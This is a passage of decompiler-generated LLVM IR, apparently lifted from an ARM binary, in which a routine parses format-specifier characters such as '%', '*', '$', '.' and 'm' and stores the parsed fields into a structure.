dec_label_pc_bef0:                                ; preds = %dec_label_pc_bee0
  %v1_bef0 = add i32 %storemerge105, -1
  %v2_bef0 = inttoptr i32 %v1_bef0 to i8*
  %v3_bef0 = load i8, i8* %v2_bef0, align 1
  %v7_bef4 = icmp eq i8 %v3_bef0, 37
  %v0_bef8 = load i32, i32* @r4, align 4
  %v1_bef8 = and i32 %v0_bef8, 10
  store i32 %v1_bef8, i32* %r3.global-to-local, align 4
  %v4_befc = udiv i32 %v1_bef8, 2
  %v5_befc = sub nuw nsw i32 -1, %v4_befc
  %v6_befc = and i32 %v0_bef8, %v5_befc
  store i32 %v6_befc, i32* @r4, align 4
  br i1 %v7_bef4, label %dec_label_pc_bf04, label %dec_label_pc_bde0

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf08

dec_label_pc_bf08:                                ; preds = %bb133, %dec_label_pc_be40, %dec_label_pc_be98, %dec_label_pc_bf04
  %v1_bf4c = phi i32 [ %storemerge105, %dec_label_pc_bf04 ], [ %v0_bea4, %bb133 ], [ %v0_bea4, %dec_label_pc_be98 ], [ %v0_bea4, %dec_label_pc_be40 ]
  %v0_bf48 = phi i32 [ %v5_bec8, %dec_label_pc_bf04 ], [ %v0_be40, %bb133 ], [ %v0_be40, %dec_label_pc_be98 ], [ %v0_be40, %dec_label_pc_be40 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_bf04 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_be98 ], [ %stack_var_-48.1, %dec_label_pc_be40 ]
  %v1_bf08 = inttoptr i32 %v0_bf48 to i8*
  %v2_bf08 = load i8, i8* %v1_bf08, align 1
  %v3_bf08 = zext i8 %v2_bf08 to i32
  store i32 %v3_bf08, i32* %r3.global-to-local, align 4
  %v7_bf0c = icmp eq i8 %v2_bf08, 42
  br i1 %v7_bf0c, label %dec_label_pc_bf14, label %dec_label_pc_bf58

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bf08
  %v0_bf14 = load i32, i32* %sb.global-to-local, align 4
  %v2_bf14 = icmp eq i32 %v0_bf14, 0
  br i1 %v2_bf14, label %dec_label_pc_bf48, label %dec_label_pc_bf1c

dec_label_pc_bf1c:                                ; preds = %dec_label_pc_bf14
  %v1_bf1c = inttoptr i32 %v1_bf4c to i8*
  %v2_bf1c = load i8, i8* %v1_bf1c, align 1
  %v3_bf1c = zext i8 %v2_bf1c to i32
  store i32 %v3_bf1c, i32* %r3.global-to-local, align 4
  %v7_bf20 = icmp eq i8 %v2_bf1c, 36
  br i1 %v7_bf20, label %dec_label_pc_bf28, label %dec_label_pc_c1d0

dec_label_pc_bf28:                                ; preds = %dec_label_pc_bf1c
  %v0_bf28 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_bf28, 1
  br i1 %tmp134, label %dec_label_pc_c1d0, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf28
  store i32 %v25_bd3c, i32* %r1.global-to-local, align 4
  %v0_bf38 = load i32, i32* @lr, align 4
  %v3_bf38 = mul i32 %v0_bf38, -4
  %v4_bf38 = add i32 %v3_bf38, %v25_bd3c
  store i32 %v4_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = add i32 %v1_bf4c, 1
  store i32 %v1_bf3c, i32* %r6.global-to-local, align 4
  %v2_bf40 = add i32 %v4_bf38, -24
  %v3_bf40 = inttoptr i32 %v2_bf40 to i32*
  store i32 %v0_bf28, i32* %v3_bf40, align 4
  br label %dec_label_pc_bf54

dec_label_pc_bf48:                                ; preds = %dec_label_pc_bf14
  %v1_bf48 = add i32 %v0_bf48, 1
  store i32 %v1_bf48, i32* %r3.global-to-local, align 4
  %v9_bf4c = icmp eq i32 %v1_bf48, %v1_bf4c
  br i1 %v9_bf4c, label %dec_label_pc_bf54, label %dec_label_pc_c1d0

dec_label_pc_bf54:                                ; preds = %dec_label_pc_bf48, %dec_label_pc_bf30
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf58

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf08, %dec_label_pc_bf54
  %v0_bf58 = load i32, i32* @lr, align 4
  %v2_bf58 = icmp eq i32 %v0_bf58, 0
  br i1 %v2_bf58, label %dec_label_pc_bf60, label %dec_label_pc_bd78

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf58
  %v0_bf60 = load i32, i32* %r6.global-to-local, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v3_bf60 = zext i8 %v2_bf60 to i32
  store i32 %v3_bf60, i32* %r3.global-to-local, align 4
  %v7_bf64 = icmp eq i8 %v2_bf60, 46
  br i1 %v7_bf64, label %.thread22, label %dec_label_pc_bf78

.thread22:                                        ; preds = %dec_label_pc_bf60
  %v2_bf68 = add i32 %v0_bf60, 1
  store i32 %v2_bf68, i32* %r6.global-to-local, align 4
  %v1_bf6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_bf6c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_bde0

dec_label_pc_bf78:                                ; preds = %dec_label_pc_bf60
  %v0_bf78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bf78, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_bf80

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bf78
  %v0_bf88.pre = phi i32 [ %v0_bf60, %dec_label_pc_bf78 ], [ %v0_bf88.pre.pre, %dec_label_pc_bd78 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_bf78 ], [ %v0_bd78, %dec_label_pc_bd78 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14370.469 to i32), i32* %r1.global-to-local, align 4
  %v1_bf88 = inttoptr i32 %v0_bf88.pre to i8*
  br label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bf80
  %v0_bf94 = phi i32 [ %v1_bf94, %dec_label_pc_bf94 ], [ ptrtoint ([9 x i8]* @global_var_14370.469 to i32), %dec_label_pc_bf80 ]
  %v1_bf84 = inttoptr i32 %v0_bf94 to i8*
  %v2_bf84 = load i8, i8* %v1_bf84, align 1
  %v3_bf84 = zext i8 %v2_bf84 to i32
  store i32 %v3_bf84, i32* %r2.global-to-local, align 4
  %v2_bf88 = load i8, i8* %v1_bf88, align 1
  %v3_bf88 = zext i8 %v2_bf88 to i32
  store i32 %v3_bf88, i32* %r3.global-to-local, align 4
  %v9_bf8c = icmp eq i8 %v2_bf88, %v2_bf84
  br i1 %v9_bf8c, label %dec_label_pc_bd80, label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf84
  %v1_bf94 = add i32 %v0_bf94, 1
  %v2_bf94 = inttoptr i32 %v1_bf94 to i8*
  %v3_bf94 = load i8, i8* %v2_bf94, align 1
  %v4_bf94 = zext i8 %v3_bf94 to i32
  store i32 %v4_bf94, i32* %r3.global-to-local, align 4
  store i32 %v1_bf94, i32* %r1.global-to-local, align 4
  %v2_bf98 = icmp eq i8 %v3_bf94, 0
  br i1 %v2_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bf84

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf94, %dec_label_pc_bd80
  %v1_bfc0 = phi i32 [ %v1_bd80, %dec_label_pc_bd80 ], [ %v0_bf88.pre, %dec_label_pc_bf94 ]
  %v1_bfbc = phi i32 [ %v0_bf94, %dec_label_pc_bd80 ], [ %v1_bf94, %dec_label_pc_bf94 ]
  %v2_bfa4 = sub i32 %v1_bfbc, ptrtoint ([9 x i8]* @global_var_14370.469 to i32)
  store i32 %v2_bfa4, i32* %r3.global-to-local, align 4
  %v8_bfac = icmp sgt i32 %v2_bfa4, 1
  br i1 %v8_bfac, label %.thread25, label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_bfa0
  %v1_bfb0 = inttoptr i32 %v1_bfc0 to i8*
  %v2_bfb0 = load i8, i8* %v1_bfb0, align 1
  %v3_bfb0 = zext i8 %v2_bfb0 to i32
  store i32 %v3_bfb0, i32* %r2.global-to-local, align 4
  %v1_bfb4 = inttoptr i32 %v1_bfbc to i8*
  %v2_bfb4 = load i8, i8* %v1_bfb4, align 1
  %v3_bfb4 = zext i8 %v2_bfb4 to i32
  store i32 %v3_bfb4, i32* %r3.global-to-local, align 4
  %v9_bfb8 = icmp eq i8 %v2_bfb0, %v2_bfb4
  br i1 %v9_bfb8, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_bfb0
  %v2_bfbc = add i32 %v1_bfbc, 9
  store i32 %v2_bfbc, i32* %r1.global-to-local, align 4
  %v2_bfc0 = add i32 %v1_bfc0, 1
  store i32 %v2_bfc0, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_bfb0, %dec_label_pc_bfa0, %bb135
  %v0_bfc8 = phi i32 [ %v1_bfbc, %dec_label_pc_bfb0 ], [ %v1_bfbc, %dec_label_pc_bfa0 ], [ %v2_bfbc, %bb135 ]
  %v0_bfc4 = phi i32 [ %v1_bfc0, %dec_label_pc_bfb0 ], [ %v1_bfc0, %dec_label_pc_bfa0 ], [ %v2_bfc0, %bb135 ]
  %v1_bfc4 = inttoptr i32 %v0_bfc4 to i8*
  %v2_bfc4 = load i8, i8* %v1_bfc4, align 1
  %v3_bfc4 = zext i8 %v2_bfc4 to i32
  store i32 %v3_bfc4, i32* %r2.global-to-local, align 4
  %v1_bfc8 = add i32 %v0_bfc8, 9
  %v2_bfc8 = inttoptr i32 %v1_bfc8 to i8*
  %v3_bfc8 = load i8, i8* %v2_bfc8, align 1
  %v4_bfc8 = zext i8 %v3_bfc8 to i32
  store i32 %v4_bfc8, i32* %r3.global-to-local, align 4
  %v2_bfcc = icmp eq i8 %v2_bfc4, 0
  %v3_bfd0 = mul nuw nsw i32 %v4_bfc8, 256
  store i32 %v3_bfd0, i32* @lr, align 4
  br i1 %v2_bfcc, label %dec_label_pc_c1d0, label %dec_label_pc_bfd8

dec_label_pc_bfd8:                                ; preds = %.thread25
  %v3_bfdc = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_bfdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfe0

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_c064, %dec_label_pc_bfd8
  %v1_bff0 = phi i32 [ %v1_c064, %dec_label_pc_c064 ], [ ptrtoint ([21 x i8]* @global_var_143b0.471 to i32), %dec_label_pc_bfd8 ]
  %v1_bfe0 = inttoptr i32 %v1_bff0 to i8*
  %v2_bfe0 = load i8, i8* %v1_bfe0, align 1
  %v3_bfe0 = zext i8 %v2_bfe0 to i32
  store i32 %v3_bfe0, i32* %r3.global-to-local, align 4
  %v9_bfe4 = icmp eq i8 %v2_bfe0, %v2_bfc4
  br i1 %v9_bfe4, label %dec_label_pc_bfec, label %dec_label_pc_c064

dec_label_pc_bfec:                                ; preds = %dec_label_pc_bfe0
  store i32 ptrtoint ([21 x i8]* @global_var_143b0.471 to i32), i32* %r3.global-to-local, align 4
  %v2_bff0 = sub i32 %v1_bff0, ptrtoint ([21 x i8]* @global_var_143b0.471 to i32)
  store i32 %v2_bff0, i32* %r2.global-to-local, align 4
  %v7_bff8 = icmp slt i32 %v2_bff0, 18
  br i1 %v7_bff8, label %bb137, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_bfec
  %v1_bffc = and i32 %v3_bfd0, 1024
  %v2_bffc = icmp eq i32 %v1_bffc, 0
  br i1 %v2_bffc, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_bffc
  %v2_c000 = add i32 %v2_bff0, -2
  store i32 %v2_c000, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_bfec, %dec_label_pc_bffc, %bb136
  %v0_c004 = phi i32 [ %v2_bff0, %dec_label_pc_bfec ], [ %v2_bff0, %dec_label_pc_bffc ], [ %v2_c000, %bb136 ]
  %v1_c004 = load i32, i32* %r7.global-to-local, align 4
  %v2_c004 = add i32 %v1_c004, 32
  %v3_c004 = inttoptr i32 %v2_c004 to i32*
  store i32 %v0_c004, i32* %v3_c004, align 4
  store i32 ptrtoint (i32* @global_var_143a3.473 to i32), i32* %r1.global-to-local, align 4
  %v0_c010.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c00c

dec_label_pc_c00c:                                ; preds = %dec_label_pc_c00c, %bb137
  %v0_c00c = phi i32 [ %v1_c00c, %dec_label_pc_c00c ], [ ptrtoint (i32* @global_var_143a3.473 to i32), %bb137 ]
  %v1_c00c = add i32 %v0_c00c, 1
  %v2_c00c = inttoptr i32 %v1_c00c to i8*
  %v3_c00c = load i8, i8* %v2_c00c, align 1
  %v4_c00c = zext i8 %v3_c00c to i32
  store i32 %v4_c00c, i32* %r3.global-to-local, align 4
  store i32 %v1_c00c, i32* %r1.global-to-local, align 4
  %v8_c014 = icmp sgt i32 %v0_c010.pre, %v4_c00c
  br i1 %v8_c014, label %dec_label_pc_c00c, label %dec_label_pc_c018

dec_label_pc_c018:                                ; preds = %dec_label_pc_c00c
  store i32 ptrtoint (i32* @global_var_14394.477 to i32), i32* %r0.global-to-local, align 4
  %v2_c020 = sub i32 %v1_c00c, ptrtoint (i32* @global_var_143a4.475 to i32)
  %v2_c024 = mul i32 %v2_c020, 2
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c02c = add i32 %v2_c024, ptrtoint (i32* @global_var_14394.477 to i32)
  store i32 %v2_c02c, i32* %r2.global-to-local, align 4
  %v1_c030 = add i32 %v2_c024, add (i32 ptrtoint (i32* @global_var_14394.477 to i32), i32 1)
  %v2_c030 = inttoptr i32 %v1_c030 to i8*
  %v3_c030 = load i8, i8* %v2_c030, align 1
  %v4_c030 = zext i8 %v3_c030 to i32
  store i32 %v4_c030, i32* %r1.global-to-local, align 4
  %v2_c034 = add i32 %v2_c024, ptrtoint (i32* @global_var_14384.479 to i32)
  store i32 %v2_c034, i32* %r2.global-to-local, align 4
  %v3_c038 = inttoptr i32 %v2_c02c to i8*
  %v4_c038 = load i8, i8* %v3_c038, align 2
  %v6_c038 = zext i8 %v4_c038 to i32
  store i32 %v6_c038, i32* %r0.global-to-local, align 4
  %v1_c03c = add i32 %v2_c024, add (i32 ptrtoint (i32* @global_var_14384.479 to i32), i32 1)
  %v2_c03c = inttoptr i32 %v1_c03c to i8*
  %v3_c03c = load i8, i8* %v2_c03c, align 1
  %v4_c03c = zext i8 %v3_c03c to i32
  store i32 %v4_c03c, i32* %r2.global-to-local, align 4
  %v3_c040 = inttoptr i32 %v2_c034 to i8*
  %v4_c040 = load i8, i8* %v3_c040, align 2
  %v6_c040 = zext i8 %v4_c040 to i32
  %v3_c044 = mul nuw i32 %v4_c030, 16777216
  store i32 %v3_c044, i32* %r1.global-to-local, align 4
  %v4_c048 = sdiv i32 %v3_c044, 65536
  %v5_c048 = or i32 %v6_c038, %v4_c048
  %v3_c04c = mul nuw i32 %v4_c03c, 16777216
  store i32 %v3_c04c, i32* %r2.global-to-local, align 4
  %v4_c050 = sdiv i32 %v3_c04c, 65536
  %v5_c050 = or i32 %v6_c040, %v4_c050
  store i32 %v5_c050, i32* %r3.global-to-local, align 4
  %v0_c054 = load i32, i32* @lr, align 4
  %v2_c054 = or i32 %v5_c048, %v0_c054
  store i32 ptrtoint ([21 x i8]* @global_var_143b0.471 to i32), i32* @ip, align 4
  %v2_c05c = and i32 %v2_c054, %v5_c050
  store i32 %v2_c05c, i32* %r0.global-to-local, align 4
  %v0_c078.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c070

dec_label_pc_c064:                                ; preds = %dec_label_pc_bfe0
  %v1_c064 = add i32 %v1_bff0, 1
  %v2_c064 = inttoptr i32 %v1_c064 to i8*
  %v3_c064 = load i8, i8* %v2_c064, align 1
  %v4_c064 = zext i8 %v3_c064 to i32
  store i32 %v4_c064, i32* %r3.global-to-local, align 4
  store i32 %v1_c064, i32* @ip, align 4
  %v2_c068 = icmp eq i8 %v3_c064, 0
  br i1 %v2_c068, label %dec_label_pc_c070, label %dec_label_pc_bfe0

dec_label_pc_c070:                                ; preds = %dec_label_pc_c064, %dec_label_pc_c018
  %v0_c07c = phi i32 [ %v0_c054, %dec_label_pc_c018 ], [ %v3_bfd0, %dec_label_pc_c064 ]
  %v0_c078 = phi i32 [ %v0_c078.pre, %dec_label_pc_c018 ], [ %v0_bfc4, %dec_label_pc_c064 ]
  %v0_c070 = phi i32 [ %v2_c05c, %dec_label_pc_c018 ], [ %v3_bfdc, %dec_label_pc_c064 ]
  store i32 %v0_c070, i32* %stack_var_-36, align 4
  %v0_c074 = load i32, i32* @r4, align 4
  %v1_c074 = and i32 %v0_c074, 4
  %v1_c078 = inttoptr i32 %v0_c078 to i8*
  %v2_c078 = load i8, i8* %v1_c078, align 1
  %v3_c078 = zext i8 %v2_c078 to i32
  store i32 %v3_c078, i32* %r1.global-to-local, align 4
  %v1_c07c = and i32 %v0_c07c, 3840
  %v1_c080 = and i32 %v0_c074, -5
  %v2_c084 = or i32 %v1_c080, %v1_c07c
  store i32 %v2_c084, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_c074, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_c094 = load i32, i32* %r7.global-to-local, align 4
  %v2_c094 = add i32 %v1_c094, 12
  %v3_c094 = inttoptr i32 %v2_c094 to i32*
  store i32 %v3_c078, i32* %v3_c094, align 4
  %v0_c098 = load i32, i32* %r7.global-to-local, align 4
  %v1_c098 = add i32 %v0_c098, 4
  %v2_c098 = inttoptr i32 %v1_c098 to i32*
  %v3_c098 = load i32, i32* @r5, align 4
  store i32 %v3_c098, i32* %v2_c098, align 4
  %v4_c098 = add i32 %v0_c098, 8
  %v5_c098 = inttoptr i32 %v4_c098 to i32*
  %v6_c098 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_c098, i32* %v5_c098, align 4
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = load i32, i32* %r7.global-to-local, align 4
  %v2_c09c = add i32 %v1_c09c, 20
  %v3_c09c = inttoptr i32 %v2_c09c to i32*
  store i32 %v0_c09c, i32* %v3_c09c, align 4
  %v0_c0a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0a0 = add i32 %v1_c0a0, 16
  %v3_c0a0 = inttoptr i32 %v2_c0a0 to i32*
  store i32 %v0_c0a0, i32* %v3_c0a0, align 4
  %v0_c0a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_c0a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0a4 = add i32 %v1_c0a4, 28
  %v3_c0a4 = inttoptr i32 %v2_c0a4 to i32*
  store i32 %v0_c0a4, i32* %v3_c0a4, align 4
  %v0_c0a8 = load i32, i32* @ip, align 4
  %v1_c0a8 = inttoptr i32 %v0_c0a8 to i8*
  %v2_c0a8 = load i8, i8* %v1_c0a8, align 1
  %v3_c0a8 = zext i8 %v2_c0a8 to i32
  store i32 %v3_c0a8, i32* %r2.global-to-local, align 4
  %v2_c0ac = icmp eq i8 %v2_c0a8, 0
  br i1 %v2_c0ac, label %dec_label_pc_c0b4, label %dec_label_pc_c0cc

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c070
  %v0_c0b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_c0b4 = inttoptr i32 %v0_c0b4 to i8*
  %v2_c0b4 = load i8, i8* %v1_c0b4, align 1
  %v3_c0b4 = zext i8 %v2_c0b4 to i32
  store i32 %v3_c0b4, i32* %r3.global-to-local, align 4
  %v7_c0b8 = icmp eq i8 %v2_c0b4, 109
  br i1 %v7_c0b8, label %dec_label_pc_c0c0, label %dec_label_pc_c1d0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c0b4
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0c4 = add i32 %v1_c0c4, 32
  %v3_c0c4 = inttoptr i32 %v2_c0c4 to i32*
  store i32 20, i32* %v3_c0c4, align 4
  %v0_c0c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_c0c8 = add i32 %v1_c0c8, 28
  %v3_c0c8 = inttoptr i32 %v2_c0c8 to i32*
  store i32 %v0_c0c8, i32* %v3_c0c8, align 4
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c070, %dec_label_pc_c0c0
  %v0_c0cc = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_c0cc, 1
  br i1 %tmp141, label %dec_label_pc_c184, label %dec_label_pc_c0d4

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c0cc
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_c0d8

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c16c, %dec_label_pc_c0d4
  %v8_c0f4 = phi i32 [ 0, %dec_label_pc_c0d4 ], [ %v1_c170, %dec_label_pc_c16c ]
  %v7_c0dc = icmp sgt i32 %v8_c0f4, 2
  br i1 %v7_c0dc, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_c0d8
  store i32 %v25_bd3c, i32* %r2.global-to-local, align 4
  %v12_c0e0 = mul i32 %v8_c0f4, 4
  %v13_c0e0 = add i32 %v12_c0e0, %v25_bd3c
  store i32 %v13_c0e0, i32* %r3.global-to-local, align 4
  %v9_c0e4 = add i32 %v13_c0e0, -24
  %v10_c0e4 = inttoptr i32 %v9_c0e4 to i32*
  %v11_c0e4 = load i32, i32* %v10_c0e4, align 4
  store i32 %v11_c0e4, i32* %r2.global-to-local, align 4
  %v9_c0e8 = load i32, i32* %r7.global-to-local, align 4
  %v10_c0e8 = add i32 %v9_c0e8, %v8_c0f4
  store i32 %v10_c0e8, i32* %r3.global-to-local, align 4
  %v9_c0f0 = trunc i32 %v11_c0e4 to i8
  %v11_c0f0 = add i32 %v10_c0e8, 36
  %v12_c0f0 = inttoptr i32 %v11_c0f0 to i8*
  store i8 %v9_c0f0, i8* %v12_c0f0, align 1
  %v8_c0f8 = load i32, i32* %r3.global-to-local, align 4
  %v9_c0f8 = add i32 %v8_c0f8, 36
  %v10_c0f8 = inttoptr i32 %v9_c0f8 to i8*
  %v11_c0f8 = load i8, i8* %v10_c0f8, align 1
  %v12_c0f8 = zext i8 %v11_c0f8 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_c0d8
  %v10_c0f4 = add i32 %v8_c0f4, %stack_var_-48.3
  store i32 %v10_c0f4, i32* %r3.global-to-local, align 4
  %v9_c0fc = add i32 %v10_c0f4, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_c120 = phi i32 [ %v12_c0f8, %bb142 ], [ %v9_c0fc, %bb143 ]
  store i32 %v0_c120, i32* @r2, align 4
  %v1_c100 = load i32, i32* %sb.global-to-local, align 4
  %v2_c100 = sub i32 %v0_c120, %v1_c100
  %v4_c100 = xor i32 %v1_c100, %v0_c120
  %v5_c100 = xor i32 %v2_c100, %v0_c120
  %v6_c100 = and i32 %v5_c100, %v4_c100
  %v7_c100 = icmp slt i32 %v6_c100, 0
  %v8_c100 = icmp slt i32 %v2_c100, 0
  %v9_c100 = icmp eq i32 %v0_c120, %v1_c100
  %v3_c104 = xor i1 %v8_c100, %v7_c100
  %v4_c104 = or i1 %v9_c100, %v3_c104
  br i1 %v4_c104, label %dec_label_pc_c114, label %dec_label_pc_c108

dec_label_pc_c108:                                ; preds = %bb144
  %v1_c108 = add i32 %v0_c120, -9
  %v3_c108 = sub i32 8, %v0_c120
  %v4_c108 = and i32 %v3_c108, %v0_c120
  %v5_c108 = icmp slt i32 %v4_c108, 0
  %v6_c108 = icmp slt i32 %v1_c108, 0
  %v7_c108 = icmp eq i32 %v0_c120, 9
  %v3_c10c = xor i1 %v6_c108, %v5_c108
  %v4_c10c = or i1 %v7_c108, %v3_c10c
  br i1 %v4_c10c, label %dec_label_pc_c110, label %dec_label_pc_c1d0

dec_label_pc_c110:                                ; preds = %dec_label_pc_c108
  store i32 %v0_c120, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c114

dec_label_pc_c114:                                ; preds = %bb144, %dec_label_pc_c110
  store i32 %v25_bd3c, i32* @ip, align 4
  %v1_c118 = load i32, i32* %r8.global-to-local, align 4
  %v4_c118 = mul i32 %v1_c118, 4
  %v5_c118 = add i32 %v4_c118, %v25_bd3c
  store i32 %v5_c118, i32* %r3.global-to-local, align 4
  %v1_c11c = add i32 %v5_c118, -12
  %v2_c11c = inttoptr i32 %v1_c11c to i32*
  %v3_c11c = load i32, i32* %v2_c11c, align 4
  store i32 %v3_c11c, i32* %r5.global-to-local, align 4
  %v1_c120 = add i32 %v0_c120, -1
  store i32 %v1_c120, i32* %sl.global-to-local, align 4
  %v0_c124 = load i32, i32* %r7.global-to-local, align 4
  %v4_c124 = mul i32 %v1_c120, 4
  %v5_c124 = add i32 %v0_c124, %v4_c124
  store i32 %v5_c124, i32* %r3.global-to-local, align 4
  %v7_c128 = icmp eq i32 %v3_c11c, 8
  %v1_c12c = add i32 %v5_c124, 40
  %v2_c12c = inttoptr i32 %v1_c12c to i32*
  %v3_c12c = load i32, i32* %v2_c12c, align 4
  store i32 %v3_c12c, i32* @r0, align 4
  br i1 %v7_c128, label %dec_label_pc_c16c, label %dec_label_pc_c134

dec_label_pc_c134:                                ; preds = %dec_label_pc_c114
  %v9_c134 = icmp eq i32 %v3_c12c, %v3_c11c
  br i1 %v9_c134, label %dec_label_pc_c158, label %bb145

bb145:                                            ; preds = %dec_label_pc_c134
  %v8_c138 = icmp eq i32 %v3_c12c, 8
  br i1 %v8_c138, label %dec_label_pc_c158, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %bb145
  %v0_c140 = call i32 @_promoted_size()
  %v0_c148 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c148, i32* @r0, align 4
  %v0_c14c = call i32 @_promoted_size()
  store i32 %v0_c14c, i32* %r0.global-to-local, align 4
  %v8_c154 = icmp sgt i32 %v0_c140, %v0_c14c
  br i1 %v8_c154, label %dec_label_pc_c16c, label %dec_label_pc_c140.dec_label_pc_c158_crit_edge

dec_label_pc_c140.dec_label_pc_c158_crit_edge:    ; preds = %dec_label_pc_c140
  %v1_c15c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_c164.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_c164.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_c158

dec_label_pc_c158:                                ; preds = %dec_label_pc_c140.dec_label_pc_c158_crit_edge, %dec_label_pc_c134, %bb145
  %v1_c164 = phi i32 [ %v1_c164.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v1_c120, %dec_label_pc_c134 ], [ %v1_c120, %bb145 ]
  %v0_c164 = phi i32 [ %v0_c164.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v0_c124, %dec_label_pc_c134 ], [ %v0_c124, %bb145 ]
  %v1_c15c = phi i32 [ %v1_c15c.pre, %dec_label_pc_c140.dec_label_pc_c158_crit_edge ], [ %v1_c118, %dec_label_pc_c134 ], [ %v1_c118, %bb145 ]
  store i32 %v25_bd3c, i32* %r1.global-to-local, align 4
  %v4_c15c = mul i32 %v1_c15c, 4
  %v5_c15c = add i32 %v4_c15c, %v25_bd3c
  store i32 %v5_c15c, i32* %r3.global-to-local, align 4
  %v1_c160 = add i32 %v5_c15c, -12
  %v2_c160 = inttoptr i32 %v1_c160 to i32*
  %v3_c160 = load i32, i32* %v2_c160, align 4
  store i32 %v3_c160, i32* @r2, align 4
  %v4_c164 = mul i32 %v1_c164, 4
  %v5_c164 = add i32 %v4_c164, %v0_c164
  store i32 %v5_c164, i32* %r3.global-to-local, align 4
  %v2_c168 = add i32 %v5_c164, 40
  %v3_c168 = inttoptr i32 %v2_c168 to i32*
  store i32 %v3_c160, i32* %v3_c168, align 4
  br label %dec_label_pc_c16c

dec_label_pc_c16c:                                ; preds = %dec_label_pc_c114, %dec_label_pc_c140, %dec_label_pc_c158
  %v0_c16c = load i32, i32* %r7.global-to-local, align 4
  %v1_c16c = add i32 %v0_c16c, 28
  %v2_c16c = inttoptr i32 %v1_c16c to i32*
  %v3_c16c = load i32, i32* %v2_c16c, align 4
  %v0_c170 = load i32, i32* %r8.global-to-local, align 4
  %v1_c170 = add i32 %v0_c170, 1
  store i32 %v1_c170, i32* %r8.global-to-local, align 4
  %v1_c174 = add i32 %v3_c16c, 2
  store i32 %v1_c174, i32* %r3.global-to-local, align 4
  %v6_c17c = icmp slt i32 %v1_c170, %v1_c174
  br i1 %v6_c17c, label %dec_label_pc_c0d8, label %dec_label_pc_c19c

dec_label_pc_c184:                                ; preds = %dec_label_pc_c0cc
  %v0_c184 = load i32, i32* %r7.global-to-local, align 4
  %v1_c184 = add i32 %v0_c184, 28
  %v2_c184 = inttoptr i32 %v1_c184 to i32*
  %v3_c184 = load i32, i32* %v2_c184, align 4
  store i32 %v3_c184, i32* %r2.global-to-local, align 4
